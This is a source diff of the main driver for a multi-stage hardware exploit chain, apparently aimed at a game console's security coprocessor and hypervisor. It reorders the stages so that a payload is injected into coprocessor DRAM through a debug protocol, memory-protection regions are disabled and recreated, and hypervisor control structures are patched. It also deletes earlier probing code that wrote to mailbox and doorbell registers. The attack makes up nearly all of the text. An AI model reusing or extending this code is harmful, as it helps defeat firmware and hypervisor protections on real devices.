@@ -3,16 +3,16 @@
  *
  * This is the main entry point that chains together all exploit stages:
  *
- *   Stage 1: TMR Bypass
- *     - Disable TMR 20 (MP4 carveout) for x86 write access to MP4 DRAM
- *     - Create TMR 21 covering kernel text region with all-access
- *     - Disable TMR 5/17/18 (HV region protections)
+ *   Stage 1: MP4 Payload Injection via DECI5S
+ *     - Use DECI5S debug protocol to have A53 write to its own DRAM
+ *     - This bypasses x86 nested page table restrictions entirely
+ *     - Write thunk, hook patch, QAF flag, and payload via A53 internal writes
  *
- *   Stage 2: MP4 Payload Injection
- *     - Write AArch64 EL3 thunk to MP4 DRAM at 0x600E0000
- *     - Write main payload to 0x607F1000
- *     - Hook mDbg_intr → thunk → payload
- *     - Enable QAF flag to activate
+ *   Stage 2: TMR Bypass
+ *     - Disable TMR 20 (MP4 carveout) — needed for later phases
+ *     - Create TMR 21 covering kernel text region with all-access
+ *     - Re-enable TMR 20 immediately (payload already written)
+ *     - Disable TMR 5/17/18 (HV region protections)
  *
  *   Stage 3: VMCB Patching
  *     - Setup SysHub TLB entries to map HV memory via MP4
@@ -202,8 +202,24 @@ int prosperous_run(void)
         return ret;
     }
 
-    /* Phase 1: TMR bypass */
-    printf("\n[*] Phase 1: TMR bypass...\n");
+    /* Phase 1: MP4 payload injection via DECI5S.
+     *
+     * This MUST happen BEFORE TMR disable because the A53 firmware
+     * needs to be running stably to process DECI5S commands.
+     * DECI5S has the A53 write to its own DRAM internally, which
+     * completely bypasses x86 nested page table restrictions.
+     */
+    printf("\n[*] Phase 1: MP4 payload injection via DECI5S...\n");
+
+    ret = deci5s_inject_payload(&ctx);
+    if (ret != 0) {
+        printf("[!] DECI5S payload injection failed: %d\n", ret);
+        return ret;
+    }
+    printf("[+] MP4 payload injected via DECI5S\n");
+
+    /* Phase 2: TMR bypass */
+    printf("\n[*] Phase 2: TMR bypass...\n");
 
     ret = tmr_bypass_init(&ctx);
     if (ret != 0) {
@@ -212,204 +228,11 @@ int prosperous_run(void)
     }
     printf("[+] TMR 20 disabled, TMR 21 created\n");
 
-    /* Phase 1.5: Attempt writing payload to accessible DRAM and
-     * use c2p mailbox to trigger A53 internal copy.
-     *
-     * Strategy:
-     *   1. Write payload+thunk to accessible DRAM (PA 0x60600000+)
-     *   2. Probe what the stock A53 firmware does with c2p commands
-     *   3. The stock firmware's IRQ handler reads c2p regs when
-     *      triggered by GIC IDs 83/78 — we need to understand
-     *      what commands it accepts natively.
-     *
-     * For now: just verify we can write to accessible DRAM and
-     * read back, then try a single c2p write to see the response.
-     */
-    printf("\n[*] Phase 1.5: Accessible DRAM write + c2p probe...\n");
-    {
-        uint64_t dmap = ctx.dmap_base;
-        uint64_t bar2 = dmap + MP4_BAR2_PA;
-
-        /* Write test pattern to accessible DRAM */
-        uint32_t test_pat = 0xDEADC0DE;
-        kernel_copyin(&test_pat, dmap + 0x60600000ULL, 4);
-        uint32_t readback = 0;
-        kernel_copyout(dmap + 0x60600000ULL, &readback, 4);
-        printf("[DRAM] Write 0xDEADC0DE to PA 0x60600000, read back: 0x%08x %s\n",
-               readback, readback == 0xDEADC0DE ? "OK" : "FAIL");
-
-        /* Read current c2p reg 0 state (don't write to it!) */
-        uint32_t c2p0 = 0;
-        kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &c2p0, 4);
-        printf("[C2P] reg0 = 0x%08x (0=idle)\n", c2p0);
-
-        /* Read all 5 c2p regs for core 0 */
-        for (int r = 0; r < 5; r++) {
-            uint32_t v;
-            kernel_copyout(bar2 + MP4_C2P_REG(0, r), &v, 4);
-            printf("[C2P] core0 reg%d = 0x%08x\n", r, v);
-        }
-
-        /* Read p2c reg for core 0 */
-        uint32_t p2c0;
-        kernel_copyout(bar2 + MP4_P2C_REG0(0), &p2c0, 4);
-        printf("[P2C] core0 reg0 = 0x%08x\n", p2c0);
-
-        /* c2p command 0x20113001 appears to be a stock firmware
-         * "write to physical address" command (reg2=0xFEE00000 is LAPIC).
-         * Test: clear reg0 to 0, wait, re-read to see if firmware refills it.
-         * If it does, the firmware is actively sending commands and we can
-         * interleave our own. */
-        printf("\n[*] Testing c2p command cycle...\n");
-
-        /* Save original state */
-        uint32_t orig_c2p[5];
-        for (int r = 0; r < 5; r++)
-            kernel_copyout(bar2 + MP4_C2P_REG(0, r), &orig_c2p[r], 4);
-
-        /* Clear reg0 to acknowledge/consume the pending command */
-        uint32_t zero = 0;
-        kernel_copyin(&zero, bar2 + MP4_C2P_REG(0, 0), 4);
-
-        /* Wait briefly for firmware to potentially send a new command */
-        usleep(10000); /* 10ms */
-
-        /* Re-read c2p state */
-        uint32_t new_c2p[5];
-        for (int r = 0; r < 5; r++)
-            kernel_copyout(bar2 + MP4_C2P_REG(0, r), &new_c2p[r], 4);
-        printf("[C2P] After clear+10ms:\n");
-        for (int r = 0; r < 5; r++)
-            printf("[C2P]   reg%d: 0x%08x -> 0x%08x%s\n", r,
-                   orig_c2p[r], new_c2p[r],
-                   new_c2p[r] != orig_c2p[r] ? " CHANGED" : "");
-
-        /* Wait longer and check again */
-        usleep(100000); /* 100ms more */
-        for (int r = 0; r < 5; r++)
-            kernel_copyout(bar2 + MP4_C2P_REG(0, r), &new_c2p[r], 4);
-        printf("[C2P] After 110ms total:\n");
-        for (int r = 0; r < 5; r++)
-            printf("[C2P]   reg%d = 0x%08x\n", r, new_c2p[r]);
-
-        /* Now try: write a test value to DRAM via c2p.
-         * Use the stock firmware command format (0x2011xxxx).
-         * If 0x20113001 writes 32-bit to phys addr:
-         *   reg1 = value?, reg2 = dest PA, reg3 = ???
-         *
-         * TEST: Write 0x41424344 to PA 0x60600010 (accessible DRAM).
-         * We can verify the write by reading back via DMAP.
-         * First write a known pattern there so we can detect changes. */
-        uint32_t marker = 0x11111111;
-        kernel_copyin(&marker, dmap + 0x60600010ULL, 4);
-
-        /* Read back to confirm our marker is there */
-        uint32_t pre_val;
-        kernel_copyout(dmap + 0x60600010ULL, &pre_val, 4);
-        printf("[TEST] PA 0x60600010 before c2p: 0x%08x\n", pre_val);
-
-        /* Send stock-format command to write to DRAM PA 0x60600010.
-         * Guessing: reg1=value, reg2=PA, reg3=size/flags
-         * Based on observed: reg1=0x10000, reg2=0xFEE00000, reg3=0x68 */
-        uint32_t test_val = 0x41424344;
-        uint32_t test_pa = 0x60600010;
-        uint32_t test_arg3 = 0x00000004; /* maybe size=4? */
-        kernel_copyin(&test_val, bar2 + MP4_C2P_REG(0, 1), 4);
-        kernel_copyin(&test_pa, bar2 + MP4_C2P_REG(0, 2), 4);
-        kernel_copyin(&test_arg3, bar2 + MP4_C2P_REG(0, 3), 4);
-
-        /* Trigger: write command to reg0 */
-        uint32_t test_cmd = 0x20113001;
-        kernel_copyin(&test_cmd, bar2 + MP4_C2P_REG(0, 0), 4);
-
-        /* Wait for processing */
-        usleep(50000); /* 50ms */
-
-        /* Check if command was consumed (reg0 cleared) */
-        uint32_t post_cmd;
-        kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &post_cmd, 4);
-        printf("[TEST] c2p reg0 after cmd: 0x%08x (0=consumed)\n", post_cmd);
-
-        /* Check if the value was written */
-        uint32_t post_val;
-        kernel_copyout(dmap + 0x60600010ULL, &post_val, 4);
-        printf("[TEST] PA 0x60600010 after c2p: 0x%08x (expect 0x41424344 if it worked)\n",
-               post_val);
-
-        /* The A53 didn't consume our command - it needs a doorbell.
-         * Scan BAR2 offsets near c2p for potential doorbell registers.
-         * Read first, then we'll try writing to a candidate.
-         *
-         * c2p data regs: 0xF6000-0xFA000 (core 0), 0xFB000+ (core 1)
-         * p2c reg: 0x10500
-         * Check surrounding areas for control/doorbell regs. */
-        printf("\n[*] Scanning for c2p doorbell register...\n");
-        {
-            uint32_t doorbell_offsets[] = {
-                0x0F5000, 0x0F5800, 0x0F5C00,  /* just before c2p */
-                0x0FB800, 0x0FC000, 0x0FD000,  /* after core 1 c2p */
-                0x0FE000, 0x0FF000,             /* end of 0xF range */
-                0x010000, 0x010400, 0x010800,   /* near p2c */
-                0x011000, 0x012000, 0x013000,   /* p2c area */
-            };
-            for (int i = 0; i < 14; i++) {
-                uint32_t v;
-                kernel_copyout(bar2 + doorbell_offsets[i], &v, 4);
-                printf("[DB] BAR2+0x%06x = 0x%08x\n", doorbell_offsets[i], v);
-            }
-        }
-
-        /* Try writing 1 to several candidate doorbell offsets and
-         * check if c2p reg0 gets consumed after each write.
-         * First re-check that our command is still pending. */
-        kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &post_cmd, 4);
-        printf("\n[*] c2p reg0 before doorbell attempts: 0x%08x\n", post_cmd);
-
-        if (post_cmd != 0) {
-            /* Try doorbell candidates one at a time */
-            uint32_t db_candidates[] = {
-                0x0F5000, 0x0FB800, 0x010000, 0x010400,
-            };
-            uint32_t db_val = 1;
-            for (int i = 0; i < 4; i++) {
-                kernel_copyin(&db_val, bar2 + db_candidates[i], 4);
-                usleep(10000); /* 10ms */
-                kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &post_cmd, 4);
-                printf("[DB] Wrote 1 to +0x%06x -> c2p reg0=0x%08x%s\n",
-                       db_candidates[i], post_cmd,
-                       post_cmd == 0 ? " CONSUMED!" : "");
-                if (post_cmd == 0)
-                    break;
-            }
-        }
-
-        /* Also try: wait 1 full second in case firmware polls slowly */
-        if (post_cmd != 0) {
-            printf("[*] Waiting 1 second for slow poll...\n");
-            usleep(1000000);
-            kernel_copyout(bar2 + MP4_C2P_REG(0, 0), &post_cmd, 4);
-            printf("[C2P] reg0 after 1s: 0x%08x\n", post_cmd);
-        }
-
-        /* Final check: did the DRAM value change? */
-        kernel_copyout(dmap + 0x60600010ULL, &post_val, 4);
-        printf("[TEST] Final PA 0x60600010 = 0x%08x\n", post_val);
-    }
-
-    /* Phase 2: MP4 payload injection */
-    printf("\n[*] Phase 2: MP4 payload injection...\n");
-
-    ret = mp4_inject_payload(&ctx);
-    if (ret != 0) {
-        printf("[!] MP4 payload injection failed: %d\n", ret);
-        tmr_restore_hv_regions(&ctx);
-        return ret;
-    }
-    printf("[+] MP4 payload injected and activated\n");
-
-    /* Re-enable TMR 20 after injection (matches original prosperous flow).
+    /* Re-enable TMR 20 immediately (matches original prosperous flow).
      * The A53 accesses its own DRAM through its IOMMU, not through x86 TMR.
-     * Leaving TMR 20 disabled causes kernel panics on game restart. */
+     * Leaving TMR 20 disabled causes kernel panics on game restart.
+     * The payload is already written via DECI5S, so we no longer need
+     * x86 access to MP4 DRAM. */
     tmr_restore_tmr20(&ctx);
     printf("[+] TMR 20 restored\n");
 
